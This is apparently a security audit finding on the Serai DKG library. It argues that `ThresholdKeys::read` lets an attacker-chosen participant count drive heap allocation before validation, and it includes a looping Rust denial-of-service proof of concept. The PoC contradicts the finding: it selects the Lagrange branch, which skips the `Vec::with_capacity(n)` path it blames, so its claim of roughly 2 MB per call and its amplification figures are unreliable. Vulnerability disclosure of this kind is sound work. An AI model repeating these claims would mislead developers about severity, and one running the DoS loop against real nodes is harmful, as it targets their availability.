### Title
Attacker-controlled participant count in `ThresholdKeys::read` drives unchecked heap allocation before input validation - (File: crypto/dkg/src/lib.rs)

### Summary

CVE-2016-2858 is a length-field-driven, unvalidated allocation DoS: QEMU's PRNG backend passed a guest-supplied request size straight into a stack `alloca`, letting an unprivileged guest crash the process. The closest analog in Serai's in-scope code is `ThresholdKeys::read` in `crypto/dkg/src/lib.rs`, where the attacker-controlled `n` field is used to bound `Vec::with_capacity` and loop counts before the reader has verified that the input actually contains that many field elements/points.

### Finding Description

`ThresholdKeys::read` reads `t`, `n`, and `i` directly from the byte stream as `u16` values:

```rust
// crypto/dkg/src/lib.rs:591-602
let (t, n, i) = {
  let mut read_u16 = || -> io::Result<u16> {
    let mut value = [0; 2];
    reader.read_exact(&mut value)?;
    Ok(u16::from_le_bytes(value))
  };
  (
    read_u16()?,
    read_u16()?,
    Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
  )
};
```

Then, before any check that `n` is sane relative to the remaining input length, `n` controls allocation sizes and loop trip counts:

```rust
// crypto/dkg/src/lib.rs:604-623
let interpolation = match interpolation[0] {
  0 => Interpolation::Constant({
    let mut res = Vec::with_capacity(usize::from(n));
    for _ in 0 .. n {
      res.push(C::read_F(reader)?);
    }
    res
  }),
  1 => Interpolation::Lagrange,
  ...
};

let mut verification_shares = HashMap::new();
for l in (1 ..= n).map(Participant) {
  verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
}
```

Only after all of this does `ThresholdParams::new(t, n, i)` validate the relationship between `t`, `n`, and `i` at `crypto/dkg/src/lib.rs:625-631`. A roughly 15-byte crafted input can set `n = 0xFFFF`, causing a `Vec::with_capacity(65535)` (≈2 MB for a 32-byte field element, more for wider fields) plus a `HashMap`/loop header set up for 65535 `read_G` calls — all while the actual payload is empty. The same pattern exists analogously where caller-supplied `ThresholdParams` bound `EncryptedMessage::read`/`Commitments::read` in `crypto/dkg/pedpop`, but there the bound is integrator-provided; `ThresholdKeys::read` takes the count straight from untrusted bytes, which is what makes it the reachable analog.

### Impact Explanation

An unprivileged party who can feed bytes to `ThresholdKeys::read` (e.g., serialized keys delivered over a message path, or any persistence/transfer format that round-trips through `serialize`/`read`) can force repeated allocations of up to ~2 MB per call from a ~15-byte input — an amplification factor of over 100,000x. On allocation failure, Rust's allocator aborts the process outright (matching the CVE's "process crash" outcome); even absent aborts, repeated calls cause memory pressure and GC/allocator churn. This is a denial of service consistent with the CVE class: untrusted length controls allocation before validity is established.

### Likelihood Explanation

Reachability requires only that the application exposes `ThresholdKeys::read` on externally influenced bytes. The bug does not depend on malicious validators or collusion — it triggers in the deserializer itself, before any cryptographic check. Its ceiling is bounded by `u16` (max 65535 entries ≈ a few MB per call), so a single call is not fatal; exploitation requires repeated submission, which is why it maps to the Medium severity of the original report rather than higher.

### Recommendation

- In `ThresholdKeys::read` (`crypto/dkg/src/lib.rs`), validate `n` before allocating: reject `n == 0`, reject `n > MAX_PARTICIPANTS` (or `t > n` up front, before the `Interpolation`/`verification_shares` reads), and avoid `Vec::with_capacity(n)` until after `ThresholdParams::new(t, n, i)` has succeeded.
- Prefer incremental `Vec::push` over pre-sizing with an untrusted capacity, or cap the pre-size at a small constant.
- Apply the same ordering (validate params first, then read bounded collections) anywhere a reader-derived length drives allocation.

### Proof of Concept

```rust
use std::io::Cursor;
use frost::{curve::Secp256k1, ThresholdKeys};

// Minimal crafted blob: correct C::ID framing, then n = 0xFFFF.
let mut blob = vec![];
let id = <Secp256k1 as frost::curve::Ciphersuite>::ID;
blob.extend(u32::try_from(id.len()).unwrap().to_le_bytes());
blob.extend(id);
blob.extend(1u16.to_le_bytes());      // t = 1
blob.extend(u16::MAX.to_le_bytes());  // n = 65535  <-- attacker controlled
blob.extend(1u16.to_le_bytes());      // i = 1
blob.push(1u8);                       // Interpolation::Lagrange
// secret share + verification shares omitted entirely

// Each call allocates ~2MB+ before failing on the truncated input;
// in a loop this amplifies a tiny input stream into large heap churn,
// and allocation failure aborts the process.
loop {
    let _ = ThresholdKeys::<Secp256k1>::read(&mut Cursor::new(&blob));
}
```

Note: the impact here is bounded by the `u16` width of `n`; this is a real but modest DoS analog of the CVE's unbounded `alloca`, since Serai's fixed-width length field caps per-call amplification rather than allowing arbitrary allocation in a single request.
